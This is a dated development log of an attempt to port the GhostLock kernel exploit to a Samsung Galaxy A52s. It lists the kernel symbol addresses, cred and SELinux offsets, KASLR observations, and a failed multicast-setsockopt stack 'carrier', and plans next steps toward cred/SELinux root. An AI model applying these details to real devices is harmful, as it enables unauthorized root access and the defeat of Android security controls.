# A52 GhostLock arm64 port — first attempt (2026-11-21)

- **Device:** Galaxy A52s 5G `SM-A528B`, kernel
  `5.4.254-qgki-28575149-abA528BXXSBGYI3`, Android 14, Enforcing
- **Upstream source:** [Huawei P50 Pro GhostLock 5.4 arm64 port](https://github.com/anVzdGFtb25/GhostLock-P50Pro-JAD-AL00)
  (Apache-2.0), derived from Honor 80 GT/OnePlus GhostLock.
- **A52 target:** [a52-target.h](../../research/a52-chain/ghostlock/a52-target.h)
- **Result:** the exploit builds and starts on the A52, but the MCAST carrier
  fails; no root, no panic.

## What was adapted

The P50 port and A52 share:

```text
KIMAGE_TEXT_BASE  0xffffffc010080000
KIMAGE_STEXT_LINK 0xffffffc010081000
WAITER_TASK_OFF   0x30
WAITER_LOCK_OFF   0x38
WAITER_PRIO_OFF   0x40
WAITER_DEADLINE_OFF 0x48
```

A52 stock addresses used in the target:

```text
init_task          0xffffffc012d24480
init_cred          0xffffffc012687c78
selinux_enforcing  0xffffffc0130c8c54
selinux_state      0xffffffc012f0d000
null_fops          0xffffffc012467708
random_table       0xffffffc012d94408
__schedule         0xffffffc01179ad40
do_futex           0xffffffc0103e473c
__arm64_sys_futex  0xffffffc0103e8010
task cred/real_cred 0x800/0x808
task comm          0x818
```

The binary is a static aarch64 build compiled with the A52 target header and
runs from `shell`:

```text
startup pid=... uid=2000 attr=u:r:shell:s0 enforce=1
perf-kaslr base=ffffffc010081000 slide=0000000000000000
```

## KASLR observation

`perf_event_open` is denied to the A52 shell/app, so the port used
`--kaslr-base=KIMAGE_STEXT_LINK` (the no-KASLR assumption).

A raw `sched_blocked_reason` trace record captured from
`/sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw` contained a kernel text
pointer `0xffffffc0109a4158`, which is the static `_text` address range; this
is consistent with KASLR being off, but it is not yet a proof.

## Carrier failure

The P50 carrier uses `setsockopt(SOL_IP, MCAST_BLOCK_SOURCE=43, 0x108)` to
copy a fake `rt_mutex_waiter` onto the kernel stack. On the A52:

- `MCAST_JOIN_GROUP` (opt 42) for `224.0.0.1`/`wlan0` succeeds.
- `MCAST_BLOCK_SOURCE` with a **zero/fake waiter payload** returns
  `EADDRNOTAVAIL` (`errno=99`).
- A plain source-only buffer succeeds, so A52 validates the source storage
  more strictly than the Huawei 5.4.86 carrier path.

Observed write test:

```text
slide carrier join ifindex=35 ret=0 errno=0
slide child requeue ret=-1 errno=35
slide child carrier_done=1
slide attempt 1 timed out waiting for child
slide write test FAILED
carrier=-1/99
```

No panic; boot id unchanged. This is a carrier/layout issue, not a missing
UAF.

## Next

1. Replace or adapt the MCAST carrier for A52 (pselect/select_stack or another
   stack-copy syscall), preserving the fake waiter offsets.
2. Fix the boot_id `ctl_table` address; the binary currently reads
   `lo=b045... hi=67bb...` instead of the real boot id.
3. Then retry the pointer/leaf write tests, followed by cred/SELinux root.

No root; no completion.
